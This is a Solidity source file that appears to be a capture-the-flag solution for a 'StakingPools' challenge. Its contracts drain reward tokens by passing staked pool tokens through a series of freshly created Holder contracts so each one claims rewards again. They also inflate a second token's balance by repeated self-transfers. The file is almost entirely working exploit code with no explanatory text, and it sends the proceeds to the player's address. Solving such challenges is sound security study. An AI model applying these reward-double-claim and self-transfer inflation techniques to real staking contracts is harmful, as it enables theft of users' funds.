// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";

import {StakingPoolsDeployment, StakingPools, ERC20, ERC20V2} from "./StakingPoolsDeployment.sol";

contract Holder {
    StakingPools public stakingPools;
    ERC20 public stakedToken;
    ERC20 public rewardToken0;
    ERC20 public rewardToken1;

    constructor(address stakingPools_) {
        stakingPools = StakingPools(stakingPools_);
        stakedToken = stakingPools.stakedToken();
        rewardToken0 = stakingPools.rewardTokens(0);
        rewardToken1 = stakingPools.rewardTokens(1);
        stakedToken.approve(stakingPools_, type(uint256).max);
    }

    function withdraw() external {
        stakingPools.withdraw(0);
        stakingPools.transfer(
            msg.sender,
            stakingPools.balanceOf(address(this))
        );
        rewardToken0.transfer(
            msg.sender,
            rewardToken0.balanceOf(address(this))
        );
        rewardToken1.transfer(
            msg.sender,
            rewardToken1.balanceOf(address(this))
        );
    }
}

contract StakingPoolsSolver {
    StakingPoolsDeployment public deployment;
    StakingPools public stakingPool;
    ERC20 public stakedToken;
    ERC20 public rewardToken0;
    ERC20V2 public rewardToken1;

    constructor(address deployment_) {
        deployment = StakingPoolsDeployment(deployment_);
        stakingPool = deployment.stakingPools();
        stakedToken = deployment.stakedToken();
        rewardToken0 = deployment.rewardTokens(0);
        rewardToken1 = ERC20V2(address(deployment.rewardTokens(1)));
        deployment.faucet();
    }

    function solve() external {
        while (rewardToken0.balanceOf(address(this)) != 1e8 * 1e18) {
            Holder holder = new Holder(address(stakingPool));
            stakingPool.transfer(
                address(holder),
                stakingPool.balanceOf(address(this))
            );

            holder.withdraw();
            console.log("reward0", rewardToken0.balanceOf(address(this)));
        }

        while (rewardToken1.balanceOf(address(this)) <= 16 * 1e8 * 1e18) {
            rewardToken1.transfer(
                address(this),
                rewardToken1.balanceOf(address(this))
            );
        }

        rewardToken0.transfer(
            deployment.yourAddress(),
            rewardToken0.balanceOf(address(this))
        );

        rewardToken1.transfer(
            deployment.yourAddress(),
            rewardToken1.balanceOf(address(this))
        );
    }
}
